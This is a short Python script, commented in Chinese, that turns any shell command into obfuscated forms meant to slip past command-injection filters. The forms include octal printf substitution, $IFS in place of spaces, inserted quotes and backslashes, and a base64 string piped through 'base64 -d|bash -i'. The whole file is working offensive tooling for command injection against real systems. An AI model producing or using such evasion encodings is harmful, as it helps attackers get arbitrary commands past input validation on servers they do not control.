# -*- coding: UTF-8 -*-
'''
作者：Truda
功能：Bypass Linux 命令执行
'''
import base64
separate = "\n=============================="

def bypass(command):
    # printf 8 进制
    command_8 = []
    for c in command:
        c = oct(ord(c)).replace('0o', "\\")
        command_8.append(c)

    encode_command1 = '$(printf "%s")' % "".join(command_8)
    encode_command2 = '$(printf$IFS"%s")' % "".join(command_8)
    print(encode_command1, separate)
    print(encode_command2, separate)

    # 加单引号
    command_items = command.split(" ")
    command_str = ""
    for item in command_items:
        command_item = [i for i in item]
        for i in range(1, len(item), 2):
            replace_str = "'%s'" % item[i]
            command_item[i] = replace_str
        command_str += " " + "".join(command_item)
    print(command_str[1:], separate)

    # 替换空格
    space = "$IFS"
    command_remove_space = command.replace(" ", space)
    print(command_remove_space, separate)

    # 加转义字符
    command_items = command.split(" ")
    command_str = ""
    for item in command_items:
        command_item = [i for i in item]
        for i in range(1, len(item), 2):
            replace_str = "\\%s" % item[i]
            command_item[i] = replace_str
        command_str += " " + "".join(command_item)
    print(command_str[1:], separate)

    # base64 方法一
    command_base64 = base64.b64encode(command.encode("UTF-8")).decode("utf-8")
    command_str = "echo %s|base64 -d|bash -i" % command_base64
    print(command_str, separate)


if __name__ == "__main__":
    command = input("🎃 Command: ")
    bypass(command)